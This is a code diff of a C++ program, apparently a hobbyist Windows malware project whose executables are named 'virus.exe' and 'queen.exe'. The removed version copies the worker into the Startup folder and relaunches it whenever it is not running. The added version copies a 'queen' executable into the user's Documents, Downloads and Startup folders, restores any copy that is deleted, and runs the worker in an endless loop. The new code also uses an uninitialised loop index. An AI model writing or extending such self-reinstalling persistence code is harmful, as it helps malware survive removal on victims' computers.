@@ -1,79 +1,49 @@
 #include <fstream>
 #include <iostream>
-#include <unistd.h> //sleep
-#include <dstring.h> //windows processes
-#include <tlhelp32.h> //windows processes
+#include <vector>
+#include <unistd.h> //F_OK and sleep
 
-//typedef void* HANDLE;
-bool FindRunningProcess(AnsiString process) {
-/*
-Function takes in a string value for the process it is looking for like ST3Monitor.exe
-then loops through all of the processes that are currently running on windows.
-If the process is found it is running, therefore the function returns true.
-*/
-    AnsiString compare;
-    bool procRunning = false;
-
-    HANDLE hProcessSnap;
-    PROCESSENTRY32 pe32;
-    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-
-    if (hProcessSnap == INVALID_HANDLE_VALUE) {
-        procRunning = false;
-    } else {
-        pe32.dwSize = sizeof(PROCESSENTRY32);
-        if (Process32First(hProcessSnap, &pe32)) { // Gets first running process
-            if (pe32.szExeFile == process) {
-                procRunning = true;
-            } else {
-                // loop through all running processes looking for process
-                while (Process32Next(hProcessSnap, &pe32)) { 
-                    // Set to an AnsiString instead of Char[] to make compare easier
-                    compare = pe32.szExeFile;
-                    if (compare == process) {
-                        // if found process is running, set to true and break from loop
-                        procRunning = true;
-                        break;
-                    }
-                }
-            }
-            // clean the snapshot object
-            CloseHandle(hProcessSnap);
-        }
-    }
-
-    return procRunning;
+bool exists (const std::string& name) {
+    return ( access( name.c_str(), F_OK ) != -1 );
 }
 
 int main() {
 
-    const std::string worker_egg_file_name = "virus.exe";
-    const std::string worker_egg_dest = "C:\\Program Files\\Hive\\" + worker_egg_file_name; //may be messed up because of space
+  const std::string WORKER_EGG_FILE_NAME = "virus.exe";
+  const std::string QUEEN_EGG_FILE_NAME = "queen.exe";
+  const std::string USER = std::string(std::getenv("HOMEPATH")).substr((std::string(std::getenv("HOMEPATH") ).rfind("\\") ) + 1, (std::string(std::getenv("HOMEPATH")).length()-1) );
+  const std::string WORKER_EXE_FILE_NAME = "virus.exe";
 
-    const std::string worker_exe_file_name = "virus.exe";
-    const std::string startup_dest = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\" + worker_exe_file_name;
+  std::ifstream src;
+  std::ofstream dst;
 
-    std::ifstream src;
-    std::ofstream dst;
- 
-    for (;;) { //cursed while loop formating
-        src.open(startup_dest);
-        if(!src) { //if worker.exe is not at startup
-            src.close();
-            src.open(worker_egg_dest);
-            dst.open(startup_dest);
-            dst << src.rdbuf();
-            dst.close();
-            std::cout<< "touched by GOD" <<std::endl;
-        }
-        src.close();
-
-        if(!FindRunningProcess(worker_exe_file_name))
-            std::system(startup_dest);
-
-        std::cout<<"in"<<std::endl;
-        sleep(10);
+  //the last location will not be reinstalled
+  const std::vector<std::string> QUEEN_DEST = { "C:\\Users\\"+USER+"\\Documents\\","C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\","C:\\Users\\"+USER+"\\Downloads\\"};
+  const std::vector<std::string> WORKER_DEST = {"C:\\Users\\"+USER+"\\Documents\\","C:\\Users\\"+USER+"\\Downloads\\"};
+  for (;;) { //cursed while loop formating
+    //finds first executable instance
+    int i;
+    while(i<QUEEN_DEST.size() && !exists(QUEEN_DEST[i]+QUEEN_EGG_FILE_NAME) ) ++i;
+    if(i==QUEEN_DEST.size()) {
+      std::cout<<"go download queen"<<std::endl;
+      //put it in downloads and deciment i
     }
-    return 0;
+
+    for(int j=0; j<QUEEN_DEST.size();j++) {
+      if(!exists(QUEEN_DEST[j]+QUEEN_EGG_FILE_NAME)) {
+        std::cout<<QUEEN_DEST[j]+QUEEN_EGG_FILE_NAME<<std::endl;
+        std::cout<<QUEEN_DEST[i]+QUEEN_EGG_FILE_NAME<<std::endl;
+        src.open(QUEEN_DEST[i]+QUEEN_EGG_FILE_NAME);
+        dst.open(QUEEN_DEST[j]+QUEEN_EGG_FILE_NAME);
+        dst << src.rdbuf();
+        src.close();
+        dst.close();
+      }
+    }
+    //this will stall until worker is closed
+    std::system((QUEEN_DEST[0]+WORKER_EXE_FILE_NAME).c_str());
+    sleep(30); //30 seconds before looping back to determine if worker is running
+  }
+  return 0;
 }
 
